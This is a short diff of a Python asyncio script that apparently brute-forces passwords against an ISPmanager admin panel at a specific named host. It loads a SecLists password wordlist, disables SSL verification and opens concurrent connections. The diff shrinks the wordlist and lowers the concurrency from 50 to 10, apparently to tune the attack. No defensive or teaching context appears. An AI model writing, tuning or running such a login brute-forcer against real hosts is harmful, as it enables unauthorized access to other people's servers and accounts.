@@ -4,7 +4,7 @@ import multiprocessing
 from aiohttp import ClientSession, TCPConnector
 
 variable = multiprocessing.Value('i', 0)
-fp = open('/home/andrew/SecLists/Passwords/10_million_password_list_top_100000.txt')  # open file on read mode
+fp = open('/home/andrew/SecLists/Passwords/10_million_password_list_top_10000.txt')  # open file on read mode
 lines = fp.read().split("\n")  # create a list containing all lines
 fp.close()  # close file
 
@@ -29,7 +29,7 @@ headers = {
 url='https://ageless.su/manager/ispmgr'
 
 async def lol():
-	conn = TCPConnector(verify_ssl=False, limit=50)
+	conn = TCPConnector(verify_ssl=False, limit=10)
 	async with ClientSession(connector=conn,loop=asyncio.get_event_loop()) as session:
 		tasks = []
 		i = 0
